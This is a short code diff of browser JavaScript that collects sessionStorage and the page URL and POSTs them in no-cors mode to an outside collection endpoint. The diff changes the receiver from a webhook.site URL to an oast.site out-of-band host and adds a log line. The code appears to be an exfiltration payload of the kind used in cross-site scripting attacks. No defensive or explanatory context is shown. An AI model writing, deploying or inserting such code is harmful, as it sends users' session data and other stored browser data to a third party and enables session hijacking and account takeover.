@@ -5,9 +5,11 @@
         sessionStorage: JSON.stringify(sessionStorage),
         url: window.location.href
     };
+
+    console.log("Collecting data:", data);
     
     if(typeof fetch !== 'undefined'){
-        fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/collect', {
+        fetch('https://mn0vaty9x689m9738gskrx57fzmxdo9ih.oast.site/collect', {
             method: 'POST',
             mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
